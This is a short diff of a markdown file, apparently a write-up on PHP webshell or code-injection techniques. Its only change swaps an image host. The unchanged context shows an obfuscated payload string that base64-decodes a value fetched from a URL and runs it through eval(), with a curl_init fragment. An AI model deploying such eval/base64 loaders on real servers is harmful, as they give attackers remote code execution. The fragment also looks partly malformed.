@@ -139,7 +139,7 @@ var ch=0;//");
 payload = 'http;Lyo;$bd = base64_decode($this->getURL()); $bd = $bd[5].$bd[6].$bd[7].$bd; eval(base64_decode($bd));//\\");} public function test123456(){ eval(base64_decode(this->getURL())); var ch = curl_init();//%s' % code.decode()
 ```
 
-![](https://image.silente.top/img/p2.png)
+![](https://cdn.silente.top/img/p2.png)
 
 ### cblock
 
